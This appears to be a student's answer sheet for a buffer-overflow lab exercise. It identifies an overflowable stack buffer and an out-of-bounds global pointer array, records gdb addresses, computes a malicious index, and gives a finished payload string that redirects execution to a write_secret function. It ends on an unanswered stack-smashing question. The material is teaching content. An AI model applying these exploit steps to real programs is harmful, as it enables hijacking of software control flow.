1. There is a stack-based overflow in the program.
What is the name of the stack-allocated variable that contains
the overflowed buffer?

ans: wis

2.  Consider the buffer you just identified:
Running what line of code will overflow the buffer?

ans: 62

3.  There is another vulnerability, not dependent at all on the first,
involving a non-stack allocated buffer that can be indexed outside
its bounds. What variable contains this buffer?

ans: ptrs

4.  Consider the buffer you just identified: Running what line of code overflows the buffer?

ans: 101

5. What is the address of buf?

ans: 0xbfff f130

6. What is the address of ptrs?
ans: 0x0804 a0d4

7, What is the address of write_secret?
ans: 0x0804 8534

8. what is the address of p local to main?
ans: 0xbfff f534

9. What input do you provide so that ptrs[s] reads/executes
the contents of variable p instead of function in ptrs buffer?
If ok, you will execute pat_on_back function. Enter your answer
as an unsigned integer.

ans:
(p-ptrs)/4 is
print /x (0xbffff534 - 0x804a0d4)/4
0x2dfed518 or 771675416

10. What do you enter so that ptrs[s] reads (and then tries to execute)
starting from the 65th byte in buf, ie. the location at buf[64]?
Enter your answer as an unsiged integer.

ans:
(gdb) print /x &buf[64]
$6 = 0xbffff170
(gdb) print /d  (int*)&buf[64]-(int *)&ptrs
$14 = 771675175
771675175


11. What do you replace \xEE\xEE\xEE\xEE with to call write_secret?

ans:

(gdb) print &write_secret
$7 = (void (*)(void)) 0x8048534 <write_secret>

771675175\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x08

12. Suppose you wanted to overflow the wis variable to perform a stack smashing attack. You could do this by entering 2 to call put_wisdom, and then enter enough bytes to overwrite the return address of that function, replacing it with the address of write_secret. How many bytes do you need to enter prior to the address of write_secret?
